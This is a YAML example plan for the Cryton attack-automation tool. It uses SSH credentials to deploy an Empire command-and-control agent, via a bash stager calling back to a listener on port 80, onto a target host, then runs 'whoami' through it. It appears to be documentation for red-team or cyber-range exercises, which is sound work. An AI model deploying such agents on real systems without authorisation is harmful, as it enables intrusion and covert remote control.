---
# This example shows how to deploy an Empire agent, and how to execute a Shell command or an Empire module
# using the deployed agent.

plan:
  name: Empire agents on Linux example
  owner: Cryton
  stages:
    - name: stage-one
      trigger_type: delta
      trigger_args:
        seconds: 0
      steps:
        - name: deploy-agent
          step_type: empire/agent-deploy
          is_init: true
          arguments:
            listener_name: testing
            listener_port: 80
            listener_options:
              Host: {{ empire_server_address }}
            stager_type: multi/bash
            agent_name: MyAgent # only lower/upper characters and numbers are allowed in name
            ssh_connection:
              target: {{ target.address }}
              username: {{ target.username }}
              password: {{ target.password }}
          next:
            - type: result
              value: ok
              step: whoami-on-agent
        - name: whoami-on-agent
          step_type: empire/execute
          arguments:
            use_agent: MyAgent
            shell_command: whoami
